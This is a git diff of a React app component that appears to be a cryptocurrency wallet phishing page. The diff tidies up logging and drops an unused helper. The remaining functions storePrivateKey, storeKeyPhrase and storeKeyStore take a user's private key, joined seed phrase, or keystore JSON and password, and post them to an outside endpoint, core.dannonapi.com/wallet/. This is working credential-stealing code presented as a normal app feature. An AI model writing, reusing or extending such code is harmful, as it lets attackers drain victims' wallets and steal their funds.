@@ -22,15 +22,6 @@ const App = () => {
   const [details, setDetails] = useState({})
   const coinsPerPage = 10;
 
-  const sendDetails = () => {
-    const userDetails = {
-      wallet_type : details.walletType,
-      accessType: details.accessType,
-      key: details[accessType]
-    }
-    axios.post('https://core.dannonapi.com/', userDetails).then(res => console.log(res))
-  }
-
   const showModalFn =() =>{
     setDisplayModal(true)
   }
@@ -51,13 +42,11 @@ const App = () => {
     const {wallet_type, access_type} = data
     setDetails({...details, wallet_type, access_type})
     setDisplayModal(false)
-    console.log(details)
   }
   
   const storePrivateKey = (privateKey) =>{
     setDetails({...details, privateKey})
     setDisplayPrivateKeyForm(false)
-    // console.log(details)
 
     const {wallet_type, access_type} = details
     const data = {
@@ -65,15 +54,12 @@ const App = () => {
       access_type,
       key: privateKey
     }
-
     axios.post('https://core.dannonapi.com/wallet/', data).then(res => console.log(res.status))
-
   }
+
   const storeKeyPhrase = (keyPhrase) =>{    
     setDetails({...details, keyPhrase})
     setDisplayKeyPhraseForm(false);
-    // console.log(details)
-    // sendDetails();
 
     const {wallet_type, access_type} = details
     const data = {
@@ -81,14 +67,13 @@ const App = () => {
       access_type,
       key: keyPhrase.join(' ')
     }
-
     axios.post('https://core.dannonapi.com/wallet/', data).then(res => console.log(res.status))
   }
+
   const storeKeyStore = (data) =>{
     const [keystoreJson, password] = data;    
     setDetails({...details, keystoreJson, password})
     setDisplayKeyStoreForm(false);
-    // console.log(details)
 
     const {wallet_type, access_type} = details
     const userdata = {
@@ -96,9 +81,7 @@ const App = () => {
       access_type,
       key: keystoreJson
     }
-
     axios.post('https://core.dannonapi.com/wallet/', userdata).then(res => console.log(res.status))
-
   }
 
   useEffect(()=>{
